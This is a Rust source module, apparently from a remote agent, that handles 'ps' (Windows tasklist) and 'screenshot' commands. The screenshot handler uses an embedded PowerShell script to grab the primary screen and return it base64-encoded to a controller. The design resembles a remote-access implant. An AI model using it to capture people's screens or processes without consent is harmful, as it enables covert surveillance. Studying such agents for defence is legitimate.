//! System Operations - process list, screenshot handlers for built-in commands

use crate::ops::decode_output;
use crate::protocol::AgentMessage;
use std::process::Command;
use std::sync::mpsc::Sender;

/// Check if a command is a built-in system operation
pub fn is_sys_op(command: &str) -> bool {
    matches!(command, "ps" | "screenshot")
}

/// Dispatch system operation to the appropriate handler
pub fn handle(task_id: &str, command: &str, sender: &Sender<AgentMessage>) {
    match command {
        "ps" => handle_ps(task_id, sender),
        "screenshot" => handle_screenshot(task_id, sender),
        _ => {
            let _ = sender.send(fail(task_id, format!("unknown sys op: {command}")));
        }
    }
}

/// Handle `ps` command: list running processes
fn handle_ps(task_id: &str, sender: &Sender<AgentMessage>) {
    let output = Command::new("tasklist")
        .args(["/FO", "CSV", "/NH"])
        .output();

    match output {
        Ok(out) => {
            let stdout = decode_output(&out.stdout);
            let _ = sender.send(AgentMessage::TaskResult {
                task_id: task_id.to_string(),
                success: true,
                output: stdout.trim().to_string(),
            });
        }
        Err(e) => {
            let _ = sender.send(fail(task_id, format!("ps failed: {e}")));
        }
    }
}

/// Handle `screenshot` command: capture screen
///
/// Uses PowerShell System.Drawing capture on Windows.
fn handle_screenshot(task_id: &str, sender: &Sender<AgentMessage>) {
    // Use PowerShell to capture screenshot on Windows
    let ps_script = r#"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$bounds = $screen.Bounds
$bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$ms = New-Object System.IO.MemoryStream
$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
[Convert]::ToBase64String($ms.ToArray())
"#;

    let output = Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-Command", ps_script])
        .output();

    match output {
        Ok(out) => {
            if out.status.success() {
                let b64 = decode_output(&out.stdout);
                let b64 = b64.trim().to_string();
                let _ = sender.send(AgentMessage::TaskResult {
                    task_id: task_id.to_string(),
                    success: true,
                    output: b64,
                });
            } else {
                let stderr = decode_output(&out.stderr);
                let stderr = stderr.trim().to_string();
                let _ = sender.send(fail(task_id, format!("screenshot failed: {stderr}")));
            }
        }
        Err(e) => {
            let _ = sender.send(fail(task_id, format!("screenshot failed: {e}")));
        }
    }
}

fn fail(task_id: &str, detail: String) -> AgentMessage {
    AgentMessage::TaskResult {
        task_id: task_id.to_string(),
        success: false,
        output: detail,
    }
}
